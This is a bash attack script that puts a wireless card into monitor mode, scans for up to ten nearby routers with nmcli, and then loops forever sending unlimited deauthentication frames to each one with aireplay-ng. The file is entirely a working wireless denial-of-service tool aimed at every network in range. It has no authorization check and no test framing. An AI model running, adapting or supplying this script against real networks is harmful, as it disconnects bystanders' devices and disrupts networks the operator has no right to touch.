#!/bin/bash

# Fast Multi Deauth Attack Script (No file saves, fast scan via nmcli)

interface="wlan0"
mon_interface="${interface}mon"

cleanup() {
    echo "[*] Cleaning up..."
    sudo airmon-ng stop $mon_interface > /dev/null 2>&1
    sudo systemctl start NetworkManager
    exit
}

trap cleanup INT

echo "[*] Enabling monitor mode on $interface..."
sudo airmon-ng start $interface > /dev/null 2>&1

echo "[*] Scanning nearby routers quickly using nmcli..."
bssids=($(nmcli -t -f BSSID dev wifi list | grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$" | head -n 10))

if [ ${#bssids[@]} -eq 0 ]; then
    echo "[!] No routers found. Exiting."
    cleanup
fi

echo "[*] Found ${#bssids[@]} target(s). Starting deauth attack..."

while true; do
    for bssid in "${bssids[@]}"; do
        channel=$(nmcli -f BSSID,CHAN dev wifi list | grep "$bssid" | awk '{print $2}')
        [ -z "$channel" ] && continue

        sudo iwconfig $mon_interface channel $channel
        echo "[*] Deauthing $bssid on channel $channel..."
        sudo aireplay-ng --deauth 0 -a $bssid $mon_interface > /dev/null 2>&1 &
        sleep 3
        sudo pkill aireplay-ng
    done
done
